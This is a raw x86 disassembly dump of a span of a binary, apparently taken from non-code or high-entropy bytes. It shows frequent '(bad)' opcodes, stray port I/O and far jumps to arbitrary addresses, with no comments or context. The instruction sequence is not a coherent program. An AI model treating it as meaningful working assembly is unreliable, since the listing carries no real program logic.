  411a24:	jmp    0xdd22:0xa309d6a1
  411a2b:	fcmovu st,st(2)
  411a2d:	xchg   ebp,eax
  411a2e:	dec    esp
  411a2f:	push   0xffffffb8
  411a31:	out    0xef,al
  411a33:	call   DWORD PTR [ecx-0x7af51df7]
  411a39:	std    
  411a3a:	mov    dl,0x9e
  411a3c:	jo     0x411a94
  411a3e:	retf   
  411a3f:	lahf   
  411a40:	push   ebx
  411a41:	cmp    cl,BYTE PTR [ebx]
  411a43:	retf   0x1311
  411a46:	lds    ebp,FWORD PTR [edi]
  411a48:	mov    cl,0xb
  411a4a:	fisttp WORD PTR [ecx-0x7f]
  411a4d:	adc    eax,0x85c700a0
  411a52:	scas   eax,DWORD PTR es:[edi]
  411a53:	fcomi  st,st(3)
  411a55:	icebp  
  411a56:	cwde   
  411a57:	mov    al,0x36
  411a59:	jns    0x4119dc
  411a5b:	scas   eax,DWORD PTR es:[edi]
  411a5c:	repz mov al,0x56
  411a5f:	inc    eax
  411a60:	sub    DWORD PTR [eax],edi
  411a62:	add    eax,0x8baebe5f
  411a67:	fadd   DWORD PTR [edi+0x1f]
  411a6a:	(bad)  
  411a6b:	repnz fldenv fs:[esi+0x38966773]
  411a73:	out    0xeb,eax
  411a75:	add    DWORD PTR [edi-0x4755173b],esp
  411a7b:	jno    0x411ac4
  411a7d:	jle    0x411af1
  411a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a80:	xchg   ecx,eax
  411a81:	sbb    esp,esi
  411a83:	stos   BYTE PTR es:[edi],al
  411a84:	into   
  411a85:	out    0xeb,eax
  411a87:	jmp    0x411a0c
  411a89:	repnz and cl,BYTE PTR fs:[esi]
  411a8d:	pop    edi
  411a8e:	jge    0x411b09
  411a90:	pop    ss
  411a91:	jl     0x411abd
  411a93:	xor    al,0x2
  411a95:	(bad)  
  411a96:	xchg   ebp,eax
  411a97:	hlt    
  411a98:	leave  
  411a99:	adc    al,0xf1
  411a9b:	ret    
  411a9c:	int    0xff
  411a9e:	(bad)  
  411aa0:	jl     0x411b02
  411aa2:	rol    BYTE PTR [esp+eax*8-0x5e],0xda
  411aa7:	add    eax,0xb5a87959
  411aac:	popa   
  411aad:	jg     0x411a66
  411aaf:	dec    esi
  411ab0:	jns    0x411af9
  411ab2:	dec    esi
  411ab3:	pop    eax
  411ab4:	push   ds
  411ab5:	and    DWORD PTR [edx],eax
  411ab7:	inc    eax
  411ab8:	push   ds
  411ab9:	or     BYTE PTR [edi+eiz*4],cl
  411abc:	mov    esp,0x7bf7bf3b
  411ac1:	sub    ah,BYTE PTR [ebp+0x7]
  411ac4:	xor    dl,BYTE PTR [ecx+0x30354bc3]
  411aca:	retf   
  411acb:	xor    DWORD PTR [ecx],0xffffffb0
  411ace:	mov    edi,esi
  411ad0:	call   DWORD PTR [ebx-0x7ae3d72d]
  411ad6:	fwait
  411ad7:	mov    dl,0x21
  411ad9:	xor    eax,0x8f1104d
  411ade:	sub    DWORD PTR [edx-0x24],ebp
  411ae1:	jno    0x411b60
  411ae3:	test   BYTE PTR [eax+0x5],0xf7
  411ae7:	adc    ebx,DWORD PTR [ecx+0x4688f82a]
  411aed:	cmp    bl,bl
  411aef:	xchg   ebx,eax
  411af0:	sbb    ebx,DWORD PTR [esi+eiz*8+0x6310ffde]
  411af7:	lods   al,BYTE PTR ds:[esi]
  411af8:	sub    al,BYTE PTR [edi+0x1d]
  411afb:	clc    
  411afc:	out    0xdd,eax
  411afe:	ret    
  411aff:	aad    0x9c
  411b01:	into   
  411b02:	aad    0x4e
  411b04:	loopne 0x411b3a
  411b06:	sub    DWORD PTR [edi],edi
  411b08:	or     al,0xe7
  411b0a:	mov    al,0xcf
  411b0c:	add    eax,0xa620d999
  411b11:	clc    
  411b12:	mov    edx,0x9ca70da7
  411b17:	dec    esi
  411b18:	shl    BYTE PTR [edx+0x75],cl
  411b1b:	push   es
  411b1c:	xchg   ebp,eax
  411b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b1e:	mov    ch,ah
  411b20:	adc    al,0xb7
  411b22:	iret   
  411b23:	adc    eax,0x4606dc88
  411b28:	xchg   esp,eax
  411b29:	push   ebp
  411b2a:	imul   ebp,DWORD PTR ds:0xab690252,0x46
  411b31:	daa    
  411b32:	push   cs
  411b33:	test   al,0xb9
  411b35:	pop    edi
  411b36:	dec    esp
  411b38:	icebp  
  411b39:	mov    al,ds:0x149a2644
  411b3e:	jmp    0xa8e:0x4970766d
  411b45:	mov    dh,0x37
  411b47:	lea    edx,[eax]
  411b49:	mov    al,ds:0xa58aafc1
  411b4e:	mov    al,ds:0x61d8916f
  411b53:	int    0xa5
  411b55:	lods   eax,DWORD PTR ds:[esi]
  411b56:	aaa    
  411b57:	(bad)  
  411b58:	push   0x562646a6
  411b5d:	loope  0x411bdd
  411b5f:	loopne 0x411ba5
  411b61:	adc    DWORD PTR [eax+0x5cf198a4],eax
  411b67:	dec    ebx
  411b68:	out    dx,al
  411b69:	call   0xba378db8
  411b6e:	ror    BYTE PTR [esi],1
  411b70:	add    al,0x81
  411b72:	imul   esi,DWORD PTR [ebx+0x61],0x3c7f5111
  411b79:	in     eax,0xb
  411b7b:	or     BYTE PTR [esi],ch
  411b7d:	stos   BYTE PTR es:[edi],al
  411b7e:	lods   al,BYTE PTR ds:[esi]
  411b7f:	mov    ebx,0xc111efde
  411b84:	jmp    0x52ce:0x4321095c
  411b8b:	or     DWORD PTR [ebx-0x260669f5],0xffffffce
  411b92:	pop    ecx
  411b93:	mov    bh,0x9b
  411b95:	cmp    al,0xd8
  411b97:	hlt    
  411b98:	or     eax,0x1650574f
  411b9d:	test   al,0x67
  411b9f:	nop
  411ba0:	icebp  
  411ba1:	movaps xmm4,XMMWORD PTR [ebx+0x340a7197]
  411ba8:	pop    ebx
  411ba9:	push   0x9238e0f9
  411bae:	push   edx
  411baf:	lock adc ch,al
  411bb2:	out    dx,al
  411bb3:	jmp    0x411b8e
  411bb5:	inc    ebp
  411bb6:	push   ecx
  411bb7:	and    DWORD PTR [esp+ecx*8],ebp
  411bba:	inc    ebp
  411bbb:	imul   BYTE PTR [edx+eax*4]
  411bbe:	xchg   esp,eax
  411bbf:	aaa    
  411bc0:	mov    eax,0x42cb9975
  411bc5:	cmp    BYTE PTR [edx-0x79],bh
  411bc8:	das    
  411bc9:	dec    edx
  411bca:	sub    edi,DWORD PTR [edx]
  411bcc:	mov    esi,0xef58a557
  411bd1:	dec    esp
  411bd2:	sbb    eax,0x6963e8ea
  411bd7:	aad    0x1d
  411bd9:	push   0x40a25560
  411bde:	sahf   
  411bdf:	xchg   ebx,eax
  411be0:	xor    DWORD PTR [edi+0xa],edi
  411be3:	jno    0x411c5f
  411be5:	fwait
  411be6:	jns    0x411bc7
  411be8:	repz mov ds:0x7abefe11,al
  411bee:	xchg   ebx,eax
  411bef:	dec    edx
  411bf0:	cmp    edx,ebp
  411bf2:	jmp    0x411bc1
  411bf4:	jg     0x411ba5
  411bf6:	sbb    eax,0xb483e6f4
  411bfb:	imul   ebp,DWORD PTR [edx],0x4d09d58f
  411c01:	adc    ebp,esp
  411c03:	das    
  411c04:	paddusw mm6,QWORD PTR [edx+0x3c]
  411c08:	pop    ebp
  411c09:	sbb    DWORD PTR [ecx-0xac0a850],esp
  411c0f:	popa   
  411c10:	lods   eax,DWORD PTR ds:[esi]
  411c11:	push   cs
  411c12:	call   0x4f15:0x369de89f
  411c19:	clc    
  411c1a:	add    DWORD PTR [eax],0x2687ccb1
  411c20:	push   esi
  411c21:	jge    0x411bf9
  411c23:	cld    
  411c24:	js     0x411c18
  411c26:	adc    eax,0xf39333a0
  411c2b:	xchg   bl,bh
  411c2d:	ret    
  411c2e:	xor    bh,0xe1
  411c31:	or     al,0x4d
  411c33:	outs   dx,DWORD PTR ds:[esi]
  411c34:	sbb    bl,ah
  411c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c37:	fistp  WORD PTR [ecx]
  411c39:	dec    eax
  411c3a:	jae    0x411c3d
  411c3c:	mov    esi,0xcbfec639
  411c41:	out    dx,eax
  411c42:	xchg   edi,eax
  411c43:	cmp    eax,0xe1d7fe06
  411c48:	inc    eax
  411c49:	inc    ebp
  411c4a:	jg     0x411c6e
  411c4c:	sbb    eax,0x607c427b
  411c51:	cmp    ebp,DWORD PTR [eax+0x26]
  411c54:	je     0x411cae
  411c56:	inc    ecx
  411c57:	sub    ebx,DWORD PTR [esi+0x3f286f95]
  411c5d:	cli    
  411c5e:	xchg   BYTE PTR [ecx+0x19],dh
  411c61:	stos   DWORD PTR es:[edi],eax
  411c62:	mov    eax,0x5e627d1f
  411c67:	lahf   
  411c68:	pop    edi
  411c69:	ss sub eax,0xa80bb591
  411c6f:	inc    ecx
  411c70:	mov    ds:0xa42d7f8c,eax
  411c75:	xchg   ebp,ebx
  411c77:	xor    BYTE PTR [eax],al
  411c79:	or     edi,eax
  411c7b:	je     0x411c7c
  411c7d:	mov    ah,0x25
  411c7f:	bound  ebp,QWORD PTR ds:0x894e99a4
  411c85:	rcl    BYTE PTR [ebx+edi*2],cl
  411c88:	dec    edx
  411c89:	push   esp
  411c8a:	adc    bl,BYTE PTR [ebx+eiz*2]
  411c8d:	and    ebp,DWORD PTR [ecx+edi*2]
  411c90:	out    dx,eax
  411c91:	xor    ebp,eax
  411c93:	mov    ds:0x8a647d79,eax
  411c98:	lods   eax,DWORD PTR ds:[esi]
  411c99:	(bad)
  411c9d:	cmp    BYTE PTR [edx+0x36e568dd],bl
  411ca3:	out    0x4a,eax
  411ca5:	iret   
  411ca6:	sti    
  411ca7:	mov    gs,WORD PTR [esi+0x67]
  411caa:	ss lock retf 
  411cad:	jle    0x411c8a
  411caf:	jnp    0x411ccd
  411cb1:	hlt    
  411cb2:	ret    0xc631
  411cb5:	xor    edi,DWORD PTR [ebx+ecx*8-0x4d86206b]
  411cbc:	sti    
  411cbd:	or     al,0x47
  411cbf:	cmp    al,0x15
  411cc1:	int    0x58
  411cc3:	ret    0xce33
  411cc6:	lea    ecx,[edi+0x53b54c4c]
  411ccc:	mov    edx,0x71354578
  411cd1:	mov    al,ds:0x9f1ca572
  411cd6:	jg     0x411c92
  411cd8:	ret    
  411cd9:	add    eax,0x62d3fcc3
  411cde:	pop    ebx
  411cdf:	push   esp
  411ce0:	jno    0x411ca0
  411ce2:	pop    ebp
  411ce3:	(bad)  
  411ce4:	scas   al,BYTE PTR es:[edi]
  411ce5:	mov    ds:0x464778e1,eax
  411cea:	out    dx,eax
  411ceb:	sub    esi,ecx
  411ced:	ins    DWORD PTR es:[edi],dx
  411cee:	lods   al,BYTE PTR ds:[esi]
  411cef:	lods   eax,DWORD PTR ds:[esi]
  411cf0:	and    al,BYTE PTR ds:0xc42db051
  411cf6:	ins    DWORD PTR es:[edi],dx
  411cf7:	cmp    eax,0xf164564b
  411cfc:	mul    BYTE PTR [eax]
  411cfe:	xor    BYTE PTR [ecx-0x64],al
  411d01:	ins    DWORD PTR es:[edi],dx
  411d02:	mov    ah,0xdf
  411d04:	sub    al,0x1b
  411d06:	mov    ebp,0x278ac2c8
  411d0b:	fild   DWORD PTR [edi-0x66]
  411d0e:	inc    edi
  411d0f:	sub    eax,0xbd841d6
  411d14:	out    0xbc,eax
  411d16:	pop    ds
  411d17:	mov    bh,al
  411d19:	mov    cl,0x54
  411d1b:	cmp    DWORD PTR [edx],edx
  411d1d:	out    0xc,al
  411d1f:	repnz fisttp WORD PTR [ebx-0x39]
  411d23:	push   ecx
  411d24:	inc    esp
  411d25:	mov    eax,ds:0x1c31e0d
  411d2a:	xor    DWORD PTR [esi+0x64325191],ebx
  411d30:	outs   dx,DWORD PTR ds:[esi]
  411d31:	imul   ebp,DWORD PTR ds:0x31327700,0xcd61dffa
  411d3b:	ret    
  411d3c:	sar    DWORD PTR [ebx-0x7b],0x9d
  411d40:	jge    0x411d98
  411d42:	jb     0x411d36
  411d44:	sub    eax,0x5d7726df
  411d49:	inc    esi
  411d4a:	fisub  DWORD PTR [eax-0x39]
  411d4d:	push   esi
  411d4e:	adc    BYTE PTR [ebx+edx*1-0x349af618],ah
  411d55:	sub    BYTE PTR [edx],ah
  411d57:	fld    TBYTE PTR [ecx+ebx*2]
  411d5a:	pop    ebp
  411d5b:	inc    edx
  411d5c:	call   0x62d8f28d
  411d61:	and    BYTE PTR [edi],ch
  411d63:	ds pop esp
  411d65:	xchg   DWORD PTR [edx+eax*2+0x482a5059],ebp
  411d6c:	pop    esi
  411d6d:	adc    BYTE PTR [ebp+esi*1-0x59],al
  411d71:	test   eax,eax
  411d73:	xchg   BYTE PTR [esi+0x17],dh
  411d76:	loope  0x411da7
  411d78:	or     al,ah
  411d7a:	jb     0x411d8d
  411d7c:	push   cs
  411d7d:	xor    eax,DWORD PTR [edx+0x10]
  411d80:	adc    DWORD PTR [edi-0x76],0x13
  411d84:	test   al,0x90
  411d86:	into   
  411d87:	je     0x411d4b
  411d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d8a:	out    0x9,eax
  411d8c:	scas   eax,DWORD PTR es:[edi]
  411d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d8e:	out    dx,eax
  411d8f:	or     BYTE PTR [edi],cl
  411d91:	or     ch,bh
  411d93:	ins    DWORD PTR es:[edi],dx
  411d94:	pusha  
  411d95:	xchg   esp,eax
  411d96:	pop    ebp
  411d97:	mov    edx,0x3e656c92
  411d9c:	mov    bh,0xa1
  411d9e:	jl     0x411dfe
  411da0:	dec    edx
  411da1:	fcmovb st,st(3)
  411da3:	or     DWORD PTR [edi],edi
  411da5:	cmp    ebp,ecx
  411da7:	shl    DWORD PTR [edx],1
  411da9:	ss je  0x411da2
  411dac:	fstp   QWORD PTR ds:0x628c50b4
  411db2:	push   ebx
  411db3:	enter  0x6672,0xa0
  411db7:	xchg   edi,eax
  411db8:	sub    edi,edi
  411dba:	xchg   DWORD PTR [edi-0x18],edi
  411dbd:	dec    ebp
  411dbe:	sbb    DWORD PTR [eax-0x3e],0xffffff9a
  411dc2:	call   0xb028:0xf67823eb
  411dc9:	in     al,0x7f
  411dcb:	test   eax,0x26ae8a60
  411dd0:	sub    DWORD PTR [eax],eax
  411dd2:	or     bh,ch
  411dd4:	xor    BYTE PTR [ebx+esi*8],0x89
  411dd8:	cmp    eax,0x553f2311
  411ddd:	(bad)  
  411dde:	cs pop ebx
  411de0:	inc    esi
  411de1:	push   es
  411de2:	ins    BYTE PTR es:[edi],dx
  411de3:	enter  0xc10e,0xbb
  411de7:	test   eax,0x71e13edc
  411dec:	xor    BYTE PTR ds:0x426f71b,cl
  411df2:	les    ecx,FWORD PTR [edi+0x77]
  411df5:	cs sbb dh,bh
  411df8:	mov    ds:0x7d3a773c,al
  411dfd:	arpl   WORD PTR [edx-0x2],ax
  411e00:	fcomp  st(0)
  411e02:	inc    ebx
  411e03:	rol    ebp,1
  411e05:	in     eax,dx
  411e06:	jmp    0xe050:0x332417fa
  411e0d:	idiv   BYTE PTR [ebx-0x6a]
  411e10:	cli    
  411e11:	loope  0x411e65
  411e13:	sbb    DWORD PTR [edi-0x80],0xffffff92
  411e17:	and    al,0xfe
  411e19:	repz clc 
  411e1b:	dec    ebp
  411e1c:	test   BYTE PTR [eax-0x6],cl
  411e1f:	pop    esi
  411e20:	mov    al,0x89
  411e22:	mov    ebp,0x740c64bc
  411e27:	pop    ds
  411e28:	stos   DWORD PTR es:[edi],eax
  411e29:	inc    ax
  411e2b:	jnp    0x411e4b
  411e2d:	shr    esi,0xac
  411e30:	mov    al,ds:0xe2502656
  411e35:	das    
  411e36:	imul   ecx,DWORD PTR [ebx-0x3e],0x5e
  411e3a:	inc    ebx
  411e3b:	mov    dl,0xb1
  411e3d:	mov    bh,0x2f
  411e3f:	push   eax
  411e40:	inc    ebp
  411e41:	out    dx,eax
  411e42:	cs inc ebx
  411e44:	push   ds
  411e45:	test   DWORD PTR [edx+esi*8+0x4f9383bf],0x62490775
  411e50:	mov    ebx,0xf0e3c53
  411e55:	test   DWORD PTR [eax-0x39dd3019],edx
  411e5b:	stc    
  411e5c:	lods   al,BYTE PTR ds:[esi]
  411e5d:	sub    eax,0x38350458
  411e62:	jae    0x411dfe
  411e64:	adc    DWORD PTR [ebx+0x3dacb999],eax
  411e6a:	mov    edi,DWORD PTR gs:[ecx+0x40]
  411e6e:	pusha  
  411e6f:	jl     0x411e77
  411e71:	inc    eax
  411e72:	aad    0x6
  411e74:	ins    DWORD PTR es:[edi],dx
  411e75:	test   al,0x50
  411e77:	pop    edi
  411e78:	sbb    edi,DWORD PTR [ebx-0x238e2510]
  411e7e:	push   ds
  411e7f:	ins    DWORD PTR es:[edi],dx
  411e80:	mov    al,ds:0x662d8f7d
  411e85:	mov    esi,0xc309089a
  411e8b:	inc    edx
  411e8c:	pop    esi
  411e8d:	ds and eax,0x6a5b5dd4
  411e93:	mov    eax,ds:0xa1f175ad
  411e98:	push   esp
  411e99:	or     eax,0x82b1973b
  411e9e:	loop   0x411e83
  411ea0:	cmp    al,al
  411ea2:	and    edi,eax
  411ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea5:	push   ebp
  411ea6:	fdivr  DWORD PTR [ebx+edx*8+0x1ca1af8b]
  411ead:	mov    edi,0x1d5eb1c8
  411eb2:	fdiv   QWORD PTR [ebx+0x42]
  411eb5:	and    al,0x5c
  411eb7:	rcr    BYTE PTR [eax],1
  411eb9:	test   eax,0x6af48f39
  411ebe:	push   edx
  411ebf:	jns    0x411f36
  411ec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ec2:	adc    dh,BYTE PTR [edi-0x27]
  411ec5:	mov    al,ds:0x9ef1b1d9
  411eca:	ins    BYTE PTR es:[edi],dx
  411ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ecc:	cwde   
  411ecd:	jno    0x411efa
  411ecf:	and    bl,0xac
  411ed2:	jnp    0x411e87
  411ed4:	loopne 0x411e78
  411ed6:	fild   DWORD PTR [ebp-0x40]
  411ed9:	sbb    dl,bl
  411edb:	sub    esp,DWORD PTR [esi+0x40]
  411ede:	inc    DWORD PTR [edi-0x76]
  411ee1:	pop    esi
  411ee2:	retf   0x2e5f
  411ee5:	xchg   ebx,eax
  411ee6:	adc    BYTE PTR [esi-0x80],cl
  411ee9:	xor    BYTE PTR [ecx-0x40],dl
  411eec:	jmp    0x411f46
  411eee:	(bad)  
  411eef:	out    0xf3,eax
  411ef1:	test   BYTE PTR ds:0x3f172c4b,cl
  411ef7:	push   cs
  411ef8:	in     al,0xf1
  411efa:	loop   0x411f77
  411efc:	ret    
  411efd:	jmp    0xf426e2c3
  411f02:	je     0x411f58
  411f04:	clc    
  411f05:	sbb    DWORD PTR [edx+0x3e1bb21f],esp
  411f0b:	fimul  WORD PTR [esi+ebx*2-0x3f]
  411f0f:	dec    edi
  411f10:	vshufps xmm1,xmm0,xmm0,0xfe
  411f15:	cmc    
  411f16:	mov    al,ds:0x702fb222
  411f1b:	fsubrp st(3),st
  411f1d:	gs jmp 0x411f8f
  411f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f21:	sbb    eax,edx
  411f23:	scas   al,BYTE PTR es:[edi]
  411f24:	ds (bad) 
  411f26:	ja     0x411f69
  411f28:	call   ecx
  411f2a:	in     al,dx
  411f2b:	inc    eax
  411f2c:	cmp    eax,0xb64bd5a2
  411f31:	out    0xbf,eax
  411f33:	sbb    DWORD PTR [ebx-0x20],ebp
  411f36:	in     al,dx
  411f37:	into   
  411f38:	dec    esi
  411f39:	push   ds
  411f3a:	xchg   DWORD PTR [eax+edi*1-0x57807f00],eax
  411f41:	bound  eax,QWORD PTR [esi+ecx*1]
  411f44:	arpl   WORD PTR [edi+edi*8-0x230266d1],si
  411f4b:	adc    DWORD PTR fs:[edx-0x33],ebp
  411f4f:	out    0xf,al
  411f51:	dec    esp
  411f52:	sahf   
  411f53:	xor    al,0x3b
  411f55:	ja     0x411f6a
  411f57:	xor    edx,DWORD PTR [ecx+edx*4]
  411f5a:	push   0xc7e1edf5
  411f5f:	pop    ebp
  411f60:	push   ds
  411f61:	cs push esp
  411f63:	out    dx,eax
  411f64:	es mov ch,0x79
  411f67:	pop    ebx
  411f68:	(bad)  
  411f69:	and    esp,esp
  411f6b:	ret    
  411f6c:	imul   edi,DWORD PTR [ebp+eiz*8+0x5880aeb1],0xe0c5fab4
  411f77:	cmp    al,0xa
  411f79:	adc    al,0xe4
  411f7b:	inc    edi
  411f7c:	or     edx,eax
  411f7e:	add    DWORD PTR [esi+eax*4],esi
  411f81:	mov    BYTE PTR [eax],dl
  411f83:	mov    cl,0xcd
  411f85:	pop    ebp
  411f86:	ins    BYTE PTR es:[edi],dx
  411f87:	addr16 push esi
  411f89:	mul    DWORD PTR [ebx+ebx*8]
  411f8c:	mov    dl,0x2
  411f8e:	cmp    eax,0xd97bbd95
  411f93:	jae    0x411ffa
  411f95:	fsubr  st(3),st
  411f97:	mov    DWORD PTR [esi+0x29482055],ebp
  411f9d:	sbb    cl,BYTE PTR [edx+0x47]
  411fa0:	or     BYTE PTR cs:[edx-0x58e4ab34],ah
  411fa7:	mov    al,0xdc
  411fa9:	add    al,0x8d
  411fab:	mul    DWORD PTR [edx-0x4ccf6cc8]
  411fb1:	xlat   BYTE PTR ds:[ebx]
  411fb2:	mov    dl,ch
  411fb4:	jle    0x411fef
  411fb6:	mov    ds:0x8ddf4f16,eax
  411fbb:	ret    0xf227
  411fbe:	mov    ebx,0x1c5d1bf2
  411fc3:	imul   esi,DWORD PTR [edx-0x333ff491],0xffffff98
  411fca:	neg    DWORD PTR [edi-0x8]
  411fcd:	cmp    DWORD PTR [ebp+eax*1-0x470e09f8],ebp
  411fd4:	push   eax
  411fd5:	clc    
  411fd6:	shl    BYTE PTR [ecx+0x71],cl
  411fd9:	jae    0x411f63
  411fdb:	mov    eax,0x4adb63dd
  411fe0:	inc    ebp
  411fe1:	jmp    0xc2c5a94a
  411fe6:	int3   
  411fe7:	pop    edi
  411fe8:	sti    
  411fe9:	outs   dx,BYTE PTR ds:[esi]
  411fea:	inc    esi
  411feb:	mov    al,ds:0x5a783323
  411ff0:	cmp    eax,0x7d5be518
  411ff5:	das    
  411ff6:	xchg   ebp,eax
  411ff7:	addr16 mov bh,0x70
  411ffa:	inc    esi
  411ffb:	inc    dx
  411ffd:	or     edi,ecx
  411fff:	dec    ecx
  412000:	jle    0x411fa5
  412002:	xchg   ebx,eax
  412003:	mov    al,0xe6
  412005:	ret    
  412006:	ja     0x411fa0
  412008:	cmp    BYTE PTR [eax+0x5c],ah
  41200b:	jmp    0x411fc7
  41200d:	test   dl,dh
  41200f:	pushf  
  412010:	stos   BYTE PTR es:[edi],al
  412011:	test   DWORD PTR [esi+0x18],esp
  412014:	mov    ecx,DWORD PTR [esi]
  412016:	adc    ebx,DWORD PTR [edx-0x6c]
  412019:	sub    DWORD PTR [edi+esi*4+0x1e9be33c],0xb714c913
  412024:	xlat   BYTE PTR ds:[ebx]
  412025:	dec    edx
  412026:	push   edi
  412027:	dec    edi
  412028:	retf   0xa16
  41202b:	mov    dh,BYTE PTR ds:0x38ba140b
  412031:	fldpi  
  412033:	add    dh,BYTE PTR ds:[edi-0x6bbd2bc7]
  41203a:	mov    ecx,?
  41203c:	ret    
  41203d:	ja     0x4120b5
  41203f:	loopne 0x412016
  412041:	inc    ecx
  412042:	jae    0x4120af
  412044:	ret    
  412045:	lahf   
  412046:	push   eax
  412047:	mov    bl,0x58
  412049:	stos   DWORD PTR es:[edi],eax
  41204a:	aam    0xc8
  41204c:	push   eax
  41204d:	add    BYTE PTR [ebp-0x1b],dl
  412050:	mov    dl,0xb2
  412052:	jb     0x412034
  412054:	das    
  412055:	mov    cs,ebx
  412057:	inc    ebx
  412058:	out    0x33,al
  41205a:	scas   al,BYTE PTR es:[di]
  41205c:	push   es
  41205d:	xor    esi,edx
  41205f:	mov    eax,0x425b96b4
  412064:	dec    DWORD PTR [ebx+0x71]
  412067:	inc    ecx
  412068:	add    BYTE PTR [edi+0x41e20600],ah
  41206e:	out    dx,al
  41206f:	ins    DWORD PTR es:[edi],dx
  412070:	inc    ecx
  412071:	or     DWORD PTR [ebp+0xea1968d],esp
  412077:	stos   DWORD PTR es:[edi],eax
  412078:	push   0x17
  41207a:	adc    al,0x63
  41207c:	sbb    dl,BYTE PTR [esi+ebx*2+0x1d]
  412080:	stos   DWORD PTR es:[edi],eax
  412081:	and    eax,0x3e4ffacf
  412086:	mov    al,0x67
  412088:	jge    0x41209b
  41208a:	dec    esi
  41208b:	jl     0x4120e3
  41208d:	mov    eax,ds
  41208f:	loop   0x412092
  412091:	dec    edx
  412092:	pop    es
  412093:	leave  
  412094:	xchg   ebp,eax
  412095:	push   ds
  412096:	xor    eax,0xdee03fd1
  41209b:	jmp    0xfdbb4b99
  4120a0:	or     esi,ebp
  4120a2:	pop    esp
  4120a3:	cmp    ah,al
  4120a5:	les    ebp,FWORD PTR [ebx]
  4120a7:	or     al,0x54
  4120a9:	dec    ecx
  4120aa:	and    ah,BYTE PTR [edi+edi*1-0x3a506d8f]
  4120b1:	sub    BYTE PTR [ecx+0x65149c01],0x12
  4120b8:	cs loopne 0x412084
  4120bb:	jecxz  0x412135
  4120bd:	es out dx,eax
  4120bf:	mov    ebx,0x96f9b6b4
  4120c4:	xor    al,0x53
  4120c6:	xor    ebp,ebx
  4120c8:	fucomp st(7)
  4120ca:	int    0x2
  4120cc:	(bad)  
  4120cd:	mov    ds:0x8aab4133,eax
  4120d2:	arpl   WORD PTR [esi-0x49008324],si
  4120d8:	xor    BYTE PTR [edx],0x78
  4120db:	cmc    
  4120dc:	xchg   DWORD PTR [ecx-0x57],esi
  4120df:	aaa    
  4120e0:	xchg   dl,bh
  4120e2:	push   edi
  4120e3:	rcr    BYTE PTR [ecx+0x16],cl
  4120e6:	pushf  
  4120e7:	xor    bl,BYTE PTR [ebx]
  4120e9:	add    bl,BYTE PTR [edi]
  4120eb:	and    al,0x8f
  4120ed:	jmp    0x1413d743
  4120f2:	mov    BYTE PTR [ecx-0x10],bh
  4120f5:	enter  0xe778,0x7f
  4120f9:	sbb    ecx,DWORD PTR [edx]
  4120fb:	int3   
  4120fc:	add    edi,DWORD PTR [edx+ebp*4]
  4120ff:	inc    ebp
  412100:	call   0xfb4fc290
  412105:	jno    0x412179
  412107:	jb     0x412178
  412109:	sbb    edi,DWORD PTR [edi-0x70]
  41210c:	push   ebp
  41210d:	aam    0x94
  41210f:	or     ch,BYTE PTR [esi-0x67]
  412112:	mov    esp,0x7ebae69c
  412117:	imul   ebp,DWORD PTR [ecx-0x41],0xb50e1975
  41211e:	push   eax
  41211f:	pop    ss
  412120:	fidivr DWORD PTR [ecx-0x76]
  412123:	pop    edx
  412124:	jmp    0x4120f8
  412126:	push   eax
  412127:	dec    esp
  412128:	push   edi
  412129:	clc    
  41212a:	jmp    0xca95:0x22dec0c5
  412131:	mov    ecx,0x310140c5
  412136:	and    BYTE PTR [eax+ecx*1],al
  412139:	(bad)  
  41213a:	not    esp
  41213c:	push   ebx
  41213d:	mov    cl,0xc9
  41213f:	sbb    BYTE PTR [edx-0x6a],ah
  412142:	call   0x669825c3
  412147:	push   0x60
  412149:	xchg   BYTE PTR [ecx-0x50],cl
  41214c:	ds mov ebx,0xe563b40e
  412152:	cmp    BYTE PTR [esp+ebx*4-0x36c9e3c0],ah
  412159:	stos   BYTE PTR es:[edi],al
  41215a:	outs   dx,BYTE PTR ds:[esi]
  41215b:	not    WORD PTR [eax-0x4e]
  41215f:	pop    esi
  412160:	in     eax,0x9c
  412162:	ret    0xe809
  412165:	mov    bh,0x3d
  412167:	popf   
  412168:	mov    ds,WORD PTR [ebp+0x3a]
  41216b:	cs xchg ebx,eax
  41216d:	jecxz  0x41211a
  41216f:	out    dx,al
  412170:	mov    ch,0xcb
  412172:	retf   0xcbaa
  412175:	scas   al,BYTE PTR es:[edi]
  412176:	or     DWORD PTR [edx+0x2cbbd9b6],0xf63399cf
  412180:	jmp    0xb5b7:0x8b41e15f
  412187:	rcr    BYTE PTR [edx],cl
  412189:	out    0xbb,al
  41218b:	push   cs
  41218c:	cli    
  41218d:	stc    
  41218e:	and    al,0x9a
  412190:	retf   0x731e
  412193:	pop    eax
  412194:	xor    al,0xc5
  412196:	cmp    eax,0x9b4559ca
  41219b:	dec    eax
  41219c:	outs   dx,BYTE PTR ds:[esi]
  41219d:	or     eax,0x3331dc8d
  4121a2:	mov    DWORD PTR [ebx],edi
  4121a4:	and    eax,0x8eda504c
  4121a9:	cs xor ecx,edx
  4121ac:	repz jmp 0x4121b4
  4121af:	scas   al,BYTE PTR es:[edi]
  4121b0:	adc    eax,0xe0a155b7
  4121b5:	jbe    0xa392e936
  4121bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121bc:	sub    dl,BYTE PTR [ebp-0x2f]
  4121bf:	push   esp
  4121c0:	stos   DWORD PTR es:[edi],eax
  4121c1:	mov    dh,BYTE PTR [edi-0x41]
  4121c4:	fldenv [eax]
  4121c6:	or     ch,BYTE PTR [ebx]
  4121c8:	sub    bh,BYTE PTR [edi+0x11]
  4121cb:	inc    ecx
  4121cc:	(bad)  
  4121cd:	mov    bl,0x1c
  4121cf:	mov    esp,0x1226e1aa
  4121d4:	out    0x5f,al
  4121d6:	je     0x412167
  4121d8:	mov    ds:0xe104bab8,al
  4121dd:	loop   0x41225b
  4121df:	or     al,0xb7
  4121e1:	xchg   BYTE PTR [ebx],ch
  4121e3:	std    
  4121e4:	bound  eax,QWORD PTR [ebx+eax*2]
